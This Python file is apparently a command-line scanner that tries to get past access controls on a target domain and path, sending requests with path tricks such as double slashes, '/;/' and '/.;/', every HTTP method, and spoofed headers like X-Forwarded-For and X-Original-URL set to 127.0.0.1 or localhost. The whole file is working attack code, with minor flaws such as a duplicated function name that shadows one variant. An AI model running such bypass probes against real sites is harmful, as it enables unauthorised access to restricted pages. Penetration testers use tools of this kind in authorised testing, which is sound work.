from email import header
from tracemalloc import stop
from urllib import response
import requests
import argparse
import sys
from color import *


def defult(args,path):
    print('\n')
    print(Base.OKBLUE+"Test Connection:"+Base.NC)
    print('\n')
    regex_slash = path.replace('/','\/')
    url = "https://"+args+"/"+regex_slash
    response = requests.request("GET", url)
    status_code = response.status_code
    print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[{str(status_code)}]"+Base.NC)
    
def slash_bypass(args,path):
    print('\n')
    print(Base.OKBLUE+"Bypass Test:"+Base.NC)
    print('\n')
    regex_slash = path.replace('/','\/')
    url = "https://"+args+"//"+regex_slash
    response = requests.request("GET", url)
    status_code = response.status_code
    print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[{str(status_code)}]"+Base.NC)


def slash_bypass_9(args,path):
    regex_slash = path.replace('/','\/')
    url = "https://"+args+"/"+regex_slash+"/"
    response = requests.request("GET", url)
    status_code = response.status_code
    print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[{str(status_code)}]"+Base.NC)

def slash_bypass_2(args,path):
    regex_slash = path.replace('/','\/')
    url = "https://"+args+"//"+regex_slash+"/"+regex_slash
    response = requests.request("GET", url)
    status_code = response.status_code
    print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[{str(status_code)}]"+Base.NC)

def slash_bypass_3(args,path):
    regex_slash = path.replace('/','\/')
    url = "https://"+args+"///"+regex_slash
    response = requests.request("GET", url)
    status_code = response.status_code
    print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[{str(status_code)}]"+Base.NC)

def slash_bypass_4(args,path):
    regex_slash = path.replace('/','\/')
    url = "https://"+args+"/;/"+regex_slash+"/"
    response = requests.request("GET", url)
    status_code = response.status_code
    print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[{str(status_code)}]"+Base.NC)

def slash_bypass_5(args,path):
    regex_slash = path.replace('/','\/')
    url = "https://"+args+"/./"+regex_slash+"/.."
    response = requests.request("GET", url)
    status_code = response.status_code
    print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[{str(status_code)}]"+Base.NC)

def slash_bypass_6(args,path):
    regex_slash = path.replace('/','\/')
    url = "https://"+args+"/.;/"+regex_slash+"/"
    response = requests.request("GET", url)
    status_code = response.status_code
    print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[{str(status_code)}]"+Base.NC)

def slash_bypass_7(args,path):
    regex_slash = path.replace('/','\/')
    url = "https://"+args+"/.;/"+regex_slash
    response = requests.request("GET", url)
    status_code = response.status_code
    print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[{str(status_code)}]"+Base.NC)

def slash_bypass_8(args,path):
    regex_slash = path.replace('/','\/')
    url = "https://"+args+"//;//"+regex_slash
    response = requests.request("GET", url)
    status_code = response.status_code
    print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[{str(status_code)}]"+Base.NC)

def slash_bypass_8(args,path):
    
    regex_slash = path.replace('/','\/')
    url = "https://"+args+"/"+regex_slash+".json"
    response = requests.request("GET", url)
    status_code = response.status_code
    print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[{str(status_code)}]"+Base.NC)




def post_based(args,path):
    list_header = ["X-Originating-IP","X-Forwarded-For","X-Forwarded","Forwarded-For","X-Remote-IP","X-Remote-Addr","X-ProxyUser-Ip","X-Original-URL","Client-IP","True-Client-IP","Cluster-Client-IP","X-ProxyUser-Ip","Host"]
    print('\n')
    print(Base.OKBLUE+"Header Test:"+Base.NC)
    print('\n')
    for i in list_header:
        if i != "Host":
            url = "https://"+args+"/"+path
            header = {f"{i}":"127.0.0.1"}
            response = requests.request("POST", url, headers=header)
            status_code = response.status_code
            print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{i}"+Base.NC+"    "+Base.FAIL+f"[{str(status_code)}]" )
        else:
            url = "https://"+args+"/"+path
            header = {f"{i}":"localhost"}
            response = requests.request("POST", url, headers=header)
            status_code = response.status_code
            print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{i}"+Base.NC+"    "+Base.FAIL+f"[{str(status_code)}]" )


def method_based(args,path):
    list_method = ["HEAD","OPTIONS","GET","POST","PUT","TRACE","CONNECT","PATCH"]
    print('\n')
    print(Base.OKBLUE+"Method Test:"+Base.NC)
    print('\n')
    for i in list_method:
        url = "https://"+args+"/"+path
        response = requests.request(i, url)
        status_code = response.status_code
        print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{i}"+Base.NC+"    "+Base.FAIL+f"[{str(status_code)}]" )
    
    
def cros_header(args,path):
    list_method = ["HEAD","OPTIONS","GET","POST","PUT","TRACE","CONNECT","PATCH"]
    list_header = ["X-Originating-IP","X-Forwarded-For","X-Forwarded","Forwarded-For","X-Remote-IP","X-Remote-Addr","X-ProxyUser-Ip","X-Original-URL","Client-IP","True-Client-IP","Cluster-Client-IP","X-ProxyUser-Ip","Host"]
    print('\n')
    print(Base.OKBLUE+"Cross Test"+Base.NC )
    print('\n')
    for i in list_method:
        for a in list_header:
            if i != "Host":
                url = "https://"+args+"/"+path
                header = {f"{a}":"127.0.0.1"}
                response = requests.request(i, url, headers=header)
                status_code = response.status_code
                print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{i}"+" "+f"{a}"+Base.NC+"    "+Base.FAIL+f"[{str(status_code)}]" )
            else:
                url = "https://"+args+"/"+path
                header = {f"{a}":"localhost"}
                response = requests.request("POST", url, headers=header)
                status_code = response.status_code
                print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{i}"+" "+f"{a}"+Base.NC+"    "+Base.FAIL+f"[{str(status_code)}]" )
    
    
    


def main(args,path):
    
    
    print('''
        █████                                                                      
        ░███                                                                       
        ░███████  █████ ████ ████████   ██████    █████   █████   ██████  ████████ 
        ░███░░███░░███ ░███ ░░███░░███ ░░░░░███  ███░░   ███░░   ███░░███░░███░░███
        ░███ ░███ ░███ ░███  ░███ ░███  ███████ ░░█████ ░░█████ ░███████  ░███ ░░░ 
        ░███ ░███ ░███ ░███  ░███ ░███ ███░░███  ░░░░███ ░░░░███░███░░░   ░███     
        ████████  ░░███████  ░███████ ░░████████ ██████  ██████ ░░██████  █████    
        ░░░░░░░░    ░░░███  ░ ███░░░   ░░░░░░░░ ░░░░░░  ░░░░░░   ░░░░░░  ░░░░░     
                ███    ███  ░ ███                                                  
                ░░████████   █████                                                 
                    ░░░░░░   ░░░░░  
          ''')
    
    print(Base.HEADER+f"Domain: {args}"+Base.END+"                "+Base.FAIL+f"Path: {path}"+Base.NC)
    print("\n")



while True:
    list = sys.argv
    domain = list[1]
    path = list[2]
    main(domain,path)
    defult(domain,path)
    slash_bypass(domain,path)
    slash_bypass_3(domain,path)
    slash_bypass_9(domain,path)
    slash_bypass_2(domain,path)
    slash_bypass_4(domain,path)
    slash_bypass_5(domain,path)
    slash_bypass_6(domain,path)
    slash_bypass_7(domain,path)
    slash_bypass_8(domain,path)
    method_based(domain,path)
    post_based(domain,path)
    cros_header(domain,path)
    sys.exit()

























































